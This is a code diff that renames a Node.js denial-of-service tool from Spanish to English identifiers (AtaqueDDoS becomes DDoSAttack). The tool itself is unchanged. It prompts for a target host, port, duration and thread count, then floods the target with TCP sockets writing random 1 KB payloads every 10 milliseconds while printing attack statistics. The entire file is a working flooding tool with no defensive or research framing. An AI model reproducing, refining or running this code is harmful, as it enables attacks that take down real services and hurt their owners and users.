@@ -10,143 +10,138 @@ const https = require('https');
 const os = require('os');
 const dns = require('dns').promises;
 
-class AtaqueDDoS {
+class DDoSAttack {
     constructor() {
         this.rl = readline.createInterface({
             input: process.stdin,
             output: process.stdout
         });
-        this.estadisticas = {
-            paquetes: 0,
-            exitosos: 0,
-            fallidos: 0,
-            inicio: Date.now(),
-            metodos: new Set()
+        this.stats = {
+            packets: 0,
+            successful: 0,
+            failed: 0,
+            start: Date.now(),
+            methods: new Set()
         };
-        this.trabajadores = [];
+        this.workers = [];
     }
 
-    async entrada(mensaje) {
+    async input(message) {
         return new Promise(resolve => {
-            this.rl.question(`\x1b[1;32m${mensaje}\x1b[0m`, resolve);
+            this.rl.question(`\x1b[1;32m${message}\x1b[0m`, resolve);
         });
     }
 
-    async entradaNumero(mensaje, min, max) {
+    async inputNumber(message, min, max) {
         while (true) {
-            const input = await this.entrada(mensaje);
+            const input = await this.input(message);
             const num = parseInt(input);
             if (!isNaN(num) && num >= min && num <= max) return num;
-            console.log('\x1b[1;31mEntrada inválida. Intente nuevamente.\x1b[0m');
+            console.log('\x1b[1;31mInvalid input. Please try again.\x1b[0m');
         }
     }
 
-    async resolverDNS(objetivo) {
+    async resolveDNS(target) {
         try {
-            if (!net.isIP(objetivo)) {
-                const registros = await dns.resolve4(objetivo);
-                console.log(`\x1b[1;36mDNS resuelto: ${registros[0]}\x1b[0m`);
-                return registros[0];
+            if (!net.isIP(target)) {
+                const records = await dns.resolve4(target);
+                console.log(`\x1b[1;36mDNS resolved: ${records[0]}\x1b[0m`);
+                return records[0];
             }
-            return objetivo;
+            return target;
         } catch (err) {
-            console.log('\x1b[1;33mFallo en resolución DNS, usando como IP\x1b1b[0m');
-            return objetivo;
+            console.log('\x1b[1;33mDNS resolution failed, using as IP\x1b[0m');
+            return target;
         }
     }
 
-    crearTrabajadorTCP(objetivo, puerto) {
+    createTCPWorker(target, port) {
         return () => {
-            const socket = net.connect(puerto, objetivo, () => {
+            const socket = net.connect(port, target, () => {
                 const payload = crypto.randomBytes(1024);
-                const intervalo = setInterval(() => {
+                const interval = setInterval(() => {
                     try {
                         socket.write(payload);
-                        this.estadisticas.paquetes++;
-                        this.estadisticas.exitosos++;
-                        this.estadisticas.metodos.add('TCP');
+                        this.stats.packets++;
+                        this.stats.successful++;
+                        this.stats.methods.add('TCP');
                     } catch {
-                        this.estadisticas.fallidos++;
+                        this.stats.failed++;
                     }
                 }, 10);
 
                 socket.on('error', () => {
-                    clearInterval(intervalo);
-                    this.estadisticas.fallidos++;
+                    clearInterval(interval);
+                    this.stats.failed++;
                 });
             });
             return socket;
         };
     }
 
-    async iniciar() {
-        console.log('\x1b[1;36m=== Configuración de Ataque ===\x1b[0m');
+    async start() {
+        console.log('\x1b[1;36m=== Attack Configuration ===\x1b[0m');
 
-        const objetivo = await this.entrada('Objetivo (IP/Dominio): ');
-        this.objetivo = await this.resolverDNS(objetivo);
-        this.puerto = await this.entradaNumero('Puerto (1-65535): ', 1, 65535);
-        this.duracion = await this.entradaNumero('Duración (segundos): ', 10, 3600);
-        this.hilos = await this.entradaNumero('Número de hilos: ', 1, os.cpus().length * 2);
+        const target = await this.input('Target (IP/Domain): ');
+        this.target = await this.resolveDNS(target);
+        this.port = await this.inputNumber('Port (1-65535): ', 1, 65535);
+        this.duration = await this.inputNumber('Duration (seconds): ', 10, 3600);
+        this.threads = await this.inputNumber('Number of threads: ', 1, os.cpus().length * 2);
 
-        console.log('\n\x1b[1;36m=== Resumen ===\x1b[0m');
-        console.log(`Objetivo: ${this.objetivo}`);
-        console.log(`Puerto: ${this.puerto}`);
-        console.log(`Duración: ${this.duracion}s`);
-        console.log(`Hilos: ${this.hilos}`);
+        console.log('\n\x1b[1;36m=== Summary ===\x1b[0m');
+        console.log(`Target: ${this.target}`);
+        console.log(`Port: ${this.port}`);
+        console.log(`Duration: ${this.duration}s`);
+        console.log(`Threads: ${this.threads}`);
 
-        const confirmar = await this.entrada('\n¿Iniciar ataque? (s/n): ');
-        if (confirmar.toLowerCase() !== 's') {
-            console.log('\x1b[1;33mAtaque cancelado\x1b[0m');
+        const confirm = await this.input('\nStart attack? (y/n): ');
+        if (confirm.toLowerCase() !== 'y') {
+            console.log('\x1b[1;33mAttack canceled\x1b[0m');
             process.exit(0);
         }
 
-        await this.ejecutarAtaque();
+        await this.runAttack();
     }
 
-    async ejecutarAtaque() {
-        console.log('\n\x1b[1;31mIniciando ataque...\x1b[0m');
+    async runAttack() {
+        console.log('\n\x1b[1;31mStarting attack...\x1b[0m');
 
-
-        for (let i = 0; i < this.hilos; i++) {
-            this.trabajadores.push(this.crearTrabajadorTCP(this.objetivo, this.puerto)());
+        for (let i = 0; i < this.threads; i++) {
+            this.workers.push(this.createTCPWorker(this.target, this.port)());
         }
 
-
-        const intervaloStats = setInterval(() => {
-            const tiempoTranscurrido = Math.floor((Date.now() - this.estadisticas.inicio) / 1000);
-            console.log('\n\x1b[1;35m=== Estadísticas ===\x1b[0m');
-            console.log(`Tiempo: ${tiempoTranscurrido}s`);
-            console.log(`Paquetes: ${this.estadisticas.paquetes}`);
-            console.log(`Exitosos: ${this.estadisticas.exitosos}`);
-            console.log(`Fallidos: ${this.estadisticas.fallidos}`);
-            console.log(`Métodos: ${Array.from(this.estadisticas.metodos).join(', ')}`);
+        const statsInterval = setInterval(() => {
+            const elapsed = Math.floor((Date.now() - this.stats.start) / 1000);
+            console.log('\n\x1b[1;35m=== Statistics ===\x1b[0m');
+            console.log(`Time: ${elapsed}s`);
+            console.log(`Packets: ${this.stats.packets}`);
+            console.log(`Successful: ${this.stats.successful}`);
+            console.log(`Failed: ${this.stats.failed}`);
+            console.log(`Methods: ${Array.from(this.stats.methods).join(', ')}`);
         }, 5000);
 
-
         setTimeout(() => {
-            clearInterval(intervaloStats);
-            this.detenerAtaque();
-            console.log('\n\x1b[1;32mAtaque completado\x1b[0m');
+            clearInterval(statsInterval);
+            this.stopAttack();
+            console.log('\n\x1b[1;32mAttack completed\x1b[0m');
             process.exit(0);
-        }, this.duracion * 1000);
+        }, this.duration * 1000);
     }
 
-    detenerAtaque() {
-        this.trabajadores.forEach(trabajador => {
-            if (trabajador.destroy) trabajador.destroy();
-            if (trabajador.close) trabajador.close();
+    stopAttack() {
+        this.workers.forEach(worker => {
+            if (worker.destroy) worker.destroy();
+            if (worker.close) worker.close();
         });
     }
 }
 
-
 process.on('SIGINT', () => {
-    console.log('\n\x1b[1;33mAtaque detenido manualmente\x1b[0m');
+    console.log('\n\x1b[1;33mAttack stopped manually\x1b[0m');
     process.exit(0);
 });
 
-
-new AtaqueDDoS().iniciar().catch(err => {
+new DDoSAttack().start().catch(err => {
     console.error('\x1b[1;31mError:', err.message, '\x1b[0m');
     process.exit(1);
 });
